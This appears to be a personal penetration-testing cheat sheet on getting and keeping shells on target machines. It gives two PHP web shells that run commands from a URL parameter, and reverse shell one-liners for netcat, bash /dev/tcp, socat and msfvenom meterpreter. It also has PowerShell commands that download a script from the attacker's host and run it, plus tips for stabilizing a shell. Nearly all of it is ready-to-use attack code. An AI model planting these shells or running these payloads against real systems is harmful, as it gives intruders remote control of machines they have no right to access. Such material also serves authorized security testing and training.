# shells

## Web shells

- Simple web shells

```shell
<?php system($_GET['cmd']); ?>
```

```shell
<?php echo "<pre>" . shell_exec($_GET["cmd"]) . "</pre>"; ?>
```

- Infamous pentestmonkey PHP reverse shell [https://github.com/pentestmonkey/php-reverse-shell](https://github.com/pentestmonkey/php-reverse-shell)
- PHP reverse shell (windows also) [https://github.com/ivan-sincek/php-reverse-shell/blob/master/src/reverse/php_reverse_shell.php](https://github.com/ivan-sincek/php-reverse-shell/blob/master/src/reverse/php_reverse_shell.php)

## Payloads

A list of reverse shell payloads can be found at [PayloadsAllTheThings GitHub](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Reverse%20Shell%20Cheatsheet.md). 
Common payloads include

- Netcat traditional

```
nc ip 4444 -e /bin/bash
```

- Netcat 
```
rm -f /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/bash -i 2>&1|nc ip 4444 >/tmp/f
```

- Bash TCP
```shell
bash -i >& /dev/tcp/$me/4444 0>&1
```

- Socat
```shell
# listener
socat TCP-L:4444 FILE:`tty`,raw,echo=0

# victim
socat TCP:me:4444 EXEC:"bash -li",pty,stderr,sigint,setsid,sane
```
- Powershell

```powershell
powershell -c "iex (New-Object Net.WebClient).DownloadString('http://$me:8888/Invoke-PowerShellTcp.ps1');Invoke-PowerShellTcp -Reverse -IPAddress $me -Port 4444"
```

- Powershell (staged)

```powershell
powershell (New-Object Net.WebClient).Downloadfile('http://$me:8888/Invoke-PowerShellTcp.ps1')
powershell Import-Module ./Invoke-PowerShellTcp.ps1; Invoke-PowershellTcp -Reverse -IPAddress $me -Port 4444
```

- Msfvenom

```shell
msfvenom -p linux/x64/meterpreter/reverse_tcp LHOST=$me LPORT=4444 -f elf -o rev
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=$me LPORT=4444 -f exe -o rev.exe
```

## Stabilization

- Stabilize your shell using

```shell
python3 -c 'import pty;pty.spawn("/bin/bash")'
alias ls='ls --color=auto'
alias grep='grep --color=auto'
export TERM=xterm
```

depending on Python version available.

- Set up autocomplete. Background the shell using `CTRL + Z` and run

```shell
stty raw -echo; fg
```
to foreground the shell using tab completion.

